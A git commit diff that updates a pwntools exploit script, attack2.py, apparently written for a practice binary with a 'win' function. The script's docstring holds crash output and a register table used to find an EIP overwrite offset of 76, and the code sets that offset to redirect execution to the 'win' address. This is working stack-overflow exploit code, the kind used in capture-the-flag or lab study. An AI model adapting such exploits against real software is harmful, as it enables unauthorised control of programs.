7fbceb68ea0b5dd09763d72d140ca933efe16db9
Zack Sargent <zack@zack.fyi>
2024-11-13 16:16:20 -0500

    it works again! overwrite eip

--- attack2.py
+++ attack2.py
@@ -1,45 +1,47 @@
 """
+NOW
+...
 trying i=99
-[+] Starting local process './example': pid 101
-[*] Process './example' stopped with exit code -11 (SIGSEGV) (pid 101)
+[+] Starting local process './example': pid 116
+[*] Process './example' stopped with exit code -11 (SIGSEGV) (pid 116)
 [+] Parsing corefile...: Done
-[*] '/tmp/core.example.101'
+[*] '/tmp/core.example.116'
     Arch:      i386-32-little
-    EIP:       0x56556243
-    ESP:       0x61616170
+    EIP:       0x61616174
+    ESP:       0xffffdc50
     Exe:       '/app/example' (0x56555000)
-    Fault:     0x61616170
+    Fault:     0x61616174
 +----------+------------+---------------+-------------+
 | register | hex value  | decimal value | cyclic_find |
 +----------+------------+---------------+-------------+
 | orig_eax | 0xffffffff | 4294967295    | -1          |
+| ecx      | 0xffffdec0 | 4294958784    | -1          |
+| esi      | 0xffffdc90 | 4294958224    | -1          |
+| edx      | 0xffffdc5f | 4294958175    | -1          |
+| esp      | 0xffffdc50 | 4294958160    | -1          |
+| eax      | 0xffffdc00 | 4294958080    | -1          |
 | edi      | 0xf7ffcb80 | 4160736128    | -1          |
-| ebp      | 0x61616177 | 1633771895    | 88          |
-| esi      | 0x61616176 | 1633771894    | 84          |
-| ebx      | 0x61616175 | 1633771893    | 80          |
-| ecx      | 0x61616174 | 1633771892    | 76          |
-| esp      | 0x61616170 | 1633771888    | 60          |
-| eip      | 0x56556243 | 1448436291    | -1          |
-| eflags   | 0x10282    | 66178         | -1          |
+| eip      | 0x61616174 | 1633771892    | 76          |
+| ebp      | 0x61616173 | 1633771891    | 72          |
+| ebx      | 0x61616172 | 1633771890    | 68          |
+| eflags   | 0x10286    | 66182         | -1          |
 | xgs      | 0x63       | 99            | -1          |
 | xds      | 0x2b       | 43            | -1          |
 | xes      | 0x2b       | 43            | -1          |
 | xss      | 0x2b       | 43            | -1          |
 | xcs      | 0x23       | 35            | -1          |
-| edx      | 0x1        | 1             | -1          |
-| eax      | 0x0        | 0             | -1          |
 | xfs      | 0x0        | 0             | -1          |
 +----------+------------+---------------+-------------+
-...
 """
 
 import sys
 from pwn import *
 from itertools import cycle
 
+offset = 76 # eip offset
 
 shellcode = {
-    int(sys.argv[1]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
+    offset: b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
     # int(sys.argv[2]): b"\xad\x61\x55\x56", # $1 = {<text variable, no debug info>} 0x565561ad <win>
     #  87: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
     #  59: 0x565561adb, # $1 = {<text variable, no debug info>} 0x565561ad <win>
